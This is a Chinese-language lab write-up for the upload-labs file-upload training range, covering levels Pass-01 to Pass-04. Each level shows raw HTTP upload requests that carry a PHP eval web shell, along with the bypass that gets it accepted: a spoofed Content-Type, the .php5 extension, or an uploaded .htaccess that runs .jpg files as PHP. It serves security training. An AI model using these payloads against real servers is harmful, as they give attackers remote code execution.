---
title: "upload-labs"
weight: 4
bookToc: true
---

## 环境

使用Docker快速搭建`upload labs`靶场环境，[https://github.com/c0ny1/upload-labs](https://github.com/c0ny1/upload-labs)
```bash
docker run -dt --name upload-labs -p 50070:80 cuer/upload-labs
```

部署完后访问[http://localhost:50070/](http://localhost:50070/)

本文只记录关键思路，不详细记录操作过程

文件上传的目的是，上传php脚本文件，并触发脚本的执行

## Pass-01

Burp抓包修改filename后缀
```
Connection: close

------WebKitFormBoundaryyBB7ysZsoRXuZa0z
Content-Disposition: form-data; name="upload_file"; filename="eval.php"
Content-Type: image/jpeg

<?php @eval($_GET['shell']);?>

------WebKitFormBoundaryyBB7ysZsoRXuZa0z
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryyBB7ysZsoRXuZa0z--
```

## Pass-02

Burp抓包修改filename后缀，注意Content-Type为`image/jpeg`等
```
Connection: close

------WebKitFormBoundary6AD8rNZJAAJibnyU
Content-Disposition: form-data; name="upload_file"; filename="eval.php"
Content-Type: application/octet-stream

<?php @eval($_GET['shell']);?>

------WebKitFormBoundary6AD8rNZJAAJibnyU
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundary6AD8rNZJAAJibnyU--

提示：文件类型不正确，请重新上传！
```

```
Connection: close

------WebKitFormBoundary6AD8rNZJAAJibnyU
Content-Disposition: form-data; name="upload_file"; filename="eval.php"
Content-Type: image/jpeg

<?php @eval($_GET['shell']);?>

------WebKitFormBoundary6AD8rNZJAAJibnyU
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundary6AD8rNZJAAJibnyU--
```

## Pass-03

容器部署的先修改一下配置，重启重启
```sh
cd /etc/apache2/conf-available
sed 's|application/x-httpd-php \.php|application/x-httpd-php .php .php5|' docker-php.conf
```

`提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！`，且文件上传后会重命名

```
Connection: close

------WebKitFormBoundary1aTlV7OvLvu82Ety
Content-Disposition: form-data; name="upload_file"; filename="eval.php5"
Content-Type: image/jpeg

<?php @eval($_GET['shell']);?>

------WebKitFormBoundary1aTlV7OvLvu82Ety
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundary1aTlV7OvLvu82Ety--
<img src="../upload/202410180932461191.php5" width="250px" />
```

### Pass-04

发现文件名不会被重命名，结合`.htaccess`使用

```
Connection: close

------WebKitFormBoundaryow4kbFVhhvlSJqVu
Content-Disposition: form-data; name="upload_file"; filename="eval.jpg"
Content-Type: image/jpeg

<?php @eval($_GET['shell']);?>

------WebKitFormBoundaryow4kbFVhhvlSJqVu
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryow4kbFVhhvlSJqVu--

<img src="../upload/eval.jpg" width="250px" />
```

```
Connection: close

------WebKitFormBoundaryow4kbFVhhvlSJqVu
Content-Disposition: form-data; name="upload_file"; filename=".htaccess"
Content-Type: image/jpeg

AddType application/x-httpd-php .jpg

------WebKitFormBoundaryow4kbFVhhvlSJqVu
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryow4kbFVhhvlSJqVu--

<img src="../upload/.htaccess" width="250px" />
```